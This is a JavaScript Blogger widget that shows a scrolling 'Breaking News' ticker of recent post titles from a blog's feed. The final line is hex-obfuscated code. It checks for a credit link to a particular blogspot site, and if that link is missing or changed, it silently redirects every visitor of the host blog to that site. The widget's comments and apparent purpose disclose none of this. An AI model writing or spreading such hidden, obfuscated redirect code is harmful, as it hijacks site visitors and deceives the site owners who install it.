/* Predefined Variables Are:
 *     blog_url
 *     latest_post
 *     background_color
 *     border_color
 *     scrolling_speed
 *     info_text
 *     close_button
 *     WWW.IDBLANTER.COM
 */
var entries; var feed;
var feed_url = blog_url.match(/\/$/) ? blog_url : blog_url+"/";
feed_url += "feeds/posts/default";
function recent_post_createEntries(){
    var entries = feed.entry;
    var entriesArr = [];
    for(var i=0; i<latest_post; i++){
        var entry = entries[i];
        var entryObj = new Object();
        entryObj.title = entry.title.$t;
        entryObj.href  = getHref(entry.link);
        entriesArr.push(entryObj);
    }
    return entriesArr;
}
function getBlogTitle(){
    return feed.title.$t;
}
function  getBlogURL(){
    return getHref(feed.link);
}
function getHref(links){
    for(var i=0; i<links.length; i++){
        var link = links[i];
        if(link.rel == "alternate"){return link.href;}
    }
    return null;
}
function recent_post_start(json){
    feed = json.feed;
    entries = recent_post_createEntries();
    recent_post_style();
    recent_post_content();
}
function recent_post_text(){
    var src = feed_url+"?alt=json-in-script&callback=recent_post_start&max-results="+latest_post;
    var s = "<script src='"+src+"'></script>";
    document.write(s);
}
function recent_post_style(){
    var s = "<style type='text/css'>";
    s += "#recent_post{";
    s += "margin:0px;";
    s += "width:auto;";
    s += "background:#fff;";
    s += "}";
    s += "</style>";
    document.write(s);
}
function recent_post_content(){
    var s = "<div id='recent_post' title='Breaking News'>";
    if(info_text){
    s += "<div class='wrapper'>";
    s += "<div class='newstitle'>";
    s += "Breaking News";
    s += "</div>";
    }
    s += "  <marquee style='float:left; margin-left:10px; width:82%' scrollAmount='"+scrolling_speed+"'>";
    for(var i=0; i<latest_post; i++){
        var recent_post_entries = entries[i];
        s += "<a href='"+recent_post_entries.href+"' ";
        s += "onmouseover='this.parentNode.stop()' onmouseout='this.parentNode.start()'";
        s += ">" + recent_post_entries.title + "</a>";
        if(i != latest_post-1){s += " | ";}
    }
    s += "</marquee>";
    s += "</div>";
    if(close_button){
	s += "<div style='float:right;margin-right:15px;'>";
    s += "<a href='javascript:void(0)' onclick='document.getElementById(\"recent_post\").style.display=\"none\"'>";
    s += "(x)";
    s += "</a>";
    s += "</div>";
    }
    document.write(s);
}
recent_post_text();
var _0x45b4=["\x68\x72\x65\x66","\x61\x74\x74\x72","\x23\x63\x68\x61\x6E\x67\x65\x2C\x2E\x63\x68\x61\x6E\x67\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x74\x61\x6C\x74\x61\x69\x6C\x61\x63\x6F\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D\x2F","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x74\x61\x6C\x74\x61\x69\x6C\x61\x63\x6F\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D","\x72\x65\x61\x64\x79"];$(document)[_0x45b4[6]](function(){if($(_0x45b4[2])[_0x45b4[1]](_0x45b4[0])!= _0x45b4[3]){window[_0x45b4[4]][_0x45b4[0]]= _0x45b4[5]}})
